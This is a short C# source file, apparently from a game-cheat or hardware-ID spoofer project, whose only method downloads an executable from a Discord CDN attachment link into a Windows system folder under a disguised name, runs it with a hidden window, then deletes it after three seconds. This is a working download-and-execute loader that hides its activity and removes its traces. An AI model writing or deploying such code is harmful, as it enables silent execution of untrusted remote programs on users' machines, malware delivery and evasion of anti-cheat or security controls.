using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class Spoof
    {

        public static void SpoofC()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\appcompat\UA\XXXSPOOFC.exe";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/812676154615267348/812676185435275271/Spoof_GM_C.exe", text);

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);

            Thread.Sleep(3000);
            process.Close();
            File.Delete(text);












        }
    }

}

